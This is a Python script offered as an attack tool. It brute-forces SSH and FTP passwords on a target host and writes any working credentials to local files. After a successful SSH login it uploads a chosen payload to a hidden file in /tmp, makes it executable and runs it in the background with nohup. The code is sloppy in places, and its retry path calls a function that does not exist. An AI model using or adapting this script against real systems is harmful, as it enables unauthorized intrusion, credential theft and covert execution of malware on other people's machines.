import argparse
import ftplib
import socket
import time

import paramiko
from colorama import Fore, init

init()
RED = Fore.RED
GREEN = Fore.GREEN
BLUE = Fore.BLUE
RESET = Fore.RESET


## //// SSH BRUTFORCE /// ##
## this uses paramiko - implement ssh to client.
def ssh_brute(host, username, password):
    # Initialize SSH Client
    client = paramiko.SSHClient()
    # Add to Known Hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=host, username=username, password=password, timeout=3)
    except socket.timeout:
        # When host is unreachable
        print(f"{RED}[!] Host: {host} is unreachable, timed out. {RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"[!] Invalid Credentials for {username}:{password}")
        return False
    except paramiko.SSHException:
        print(f"{BLUE}[*] Quota exceeded, retrying with delay ... {RESET}")
        # Sleep for one minute
        time.sleep(60)
        return is_ssh_open(host, username, password)
    else:
        # When Connection is Successfully Established
        print(
            f"{GREEN}[!] Found combination:\n\tHostname: {host}\n\tUSERNAME: {username} \n\tPASSWORD: {password}{RESET}"
        )
        return True


##////// EXECUT PALOAD ///// ###
## using parakiko for ssh conection ##
def execut_payload(host, username, password, payload):
    # creat ssh conection
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname=host, username=username, password=password, timeout=3)
    ## opens ssh conection
    sftp = ssh.open_sftp()
    ## uploads/transfers the file to client
    sftp.put(payload, f"/tmp/.{payload}")
    # this changest the permission of the payload that you are sending ssh.exec_command -> runs command threw ssh
    try:
        stdin, stdout, stderr = ssh.exec_command(f"chmod +x /tmp/.{payload}")
    except:
        "could not chmod +x payload"
    ## creating a veriable, using unix "nohup" -> ignors the hangup signal.
    command = f"nohup /tmp/.{payload}"
    # exevutes the command
    try:
        stin, stdout, stderr = ssh.exec_command(command)
    ## When payload is running show paload is running
    finally:
        print(f"{payload} running on {host}")


## /////// FTP BRUT_FORCE /////// #####
## using ftplib - implement ftp to the client ##
def ftp_brute(host, username, password):
    # ftp conect sets open conectio to host, if sucsessful the uses login in for (user, pass) to get conection
    try:
        ftp_server = ftplib.FTP(host, username, password, timeout=3)
    except socket.timeout:
        print(f"{RED}[!]{RESET} Host unreachable; timed out. Credentials incorrect?")
        return False
    ## error handleling
    except ftplib.all_errors as e:
        print(f"[!] Invalid Credentials for {e}")
        errorcode_string = str(e).split(None, 1)[0]
        return False
    else:
        print(
            f"{GREEN}[!]{RESET} Found combination.\n\t{host}\n\tUser: {username}\n\tPass: {password}"
        )
        return True


## ////// MAIN /////// ##
if __name__ == "__main__":
    ## any peramiter must be added using parser.add_argument
    parser = argparse.ArgumentParser(description="FTP Bruteforce")
    parser.add_argument(
        "-i", "--ip", help="Hostname or IP Address of FTP Server to bruteforce."
    )
    parser.add_argument(
        "-P", "--passlist", help="File that contains password list in each line."
    )
    parser.add_argument("-u", "--user", help="Host Username")
    parser.add_argument("-f", "--ftp", action="store_true", help="frp server")
    parser.add_argument("-s", "--ssh", action="store_true", help="ssh server")
    parser.add_argument("-l", "--payload", help="payload")

    # any new argument bust me added here as well
    # Parse Passed Arguments
    args = parser.parse_args()
    host = args.ip
    user = args.user
    passlist = args.passlist
    # Must declare a file to read
    payload = args.payload
    ftp = args.ftp
    ssh = args.ssh
    passlist = open(passlist).read().splitlines()
    #
    if not ftp and not ssh:
        print("must specifie whitch one works")
    else:
        for password in passlist:
            if ftp:
                if ftp_brute(host, user, password):
                    # If Combination is valid, save it to a text file w= write a=append
                    open("credentials.txt", "w").write(f"{user}@{host}:{password}")
                    break
            if ssh:
                if ssh_brute(host, user, password):
                    # If Combination is valid, save it to a text file
                    with open("credentials_ssh.txt", "w") as ssh_file:
                        # subprocess.run(ssh_file_permission_change, shell=True)
                        ssh_file.write(f"{user}@{host}:{password}")
                        if payload:
                            execut_payload(host, user, password, payload)
